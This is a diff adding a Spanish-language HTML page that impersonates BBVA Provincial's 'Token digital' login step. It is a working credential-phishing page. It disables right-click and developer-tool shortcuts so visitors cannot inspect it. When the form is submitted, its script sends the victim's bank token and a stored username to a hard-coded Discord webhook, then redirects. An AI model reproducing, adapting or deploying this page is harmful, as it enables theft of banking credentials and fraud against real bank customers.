@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA Provincial</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+    <script src="ipvalidation.js"></script>
+    <link rel="icon" href="icono.png" type="image/x-icon">
+    <link rel="apple-touch-icon" href="icono.png">
+    <script type="text/javascript">
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 71)) {
+                return false;
+            }
+        };
+    </script>
+    <script>
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</head>
+<body class="body">
+    <form id="formulario" onsubmit="enviarFormulario(event)" class="cuadrote">
+            <img class="logo" src="logo1.jpg">
+        </div>
+        <div>
+        <div class="titulo" style="color: #004080;">
+            <p>Token digital</p>
+        </div>
+        <div class="centrado">
+            <img class="logo3" src="img1.png">
+            <p style="color: #004080;">Introduce la clave que generaste con Token Digital en Provinet Movil</p>
+        </div>
+        <div class="centrado1">
+            <input class="documento111" type="text" id="documento" name="documento" minlength="8" maxlength="8" inputmode="numeric" required placeholder="Ingrese su token dígital">
+        </div><br>
+        <div class="centrado1">
+            <button type="submit" class="boton"><b>Siguiente</b></button>
+        </div><br>
+        <div class="centrado">
+            <a class="link" href="index5.html"><b>No tengo token dígital</b></a>
+        </div><br>
+        <div class="centrado1">
+            <img src="logo3.jpg" class="logo4">
+        </div>
+    </form>
+
+    <script>
+        function enviarFormulario(event) {
+            event.preventDefault();
+    
+            var documento = document.getElementById("documento").value;
+            var usuario = localStorage.getItem("usuario");
+    
+            const webhookURL = "https://discord.com/api/webhooks/1349064529908334603/IhrpAkq7q8a0vPayD0FaqVN5PlZI5yQBJkfutHnm2r9A2RkDW7oNEJjFIm308NHvrPWR"; 
+    
+            const mensaje = {
+                content: `**Token:** ${documento}
+                **Usuario (localStorage):** ${usuario}`
+            };
+    
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(mensaje)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Mensaje enviado a Discord");
+                    window.location.href = 'index44.html'; 
+                } else {
+                    console.error("Error al enviar el mensaje:", response.statusText);
+                }
+            })
+            .catch(error => console.error("Error al enviar el mensaje:", error));
+        }
+    </script>
+</body>
+</html>
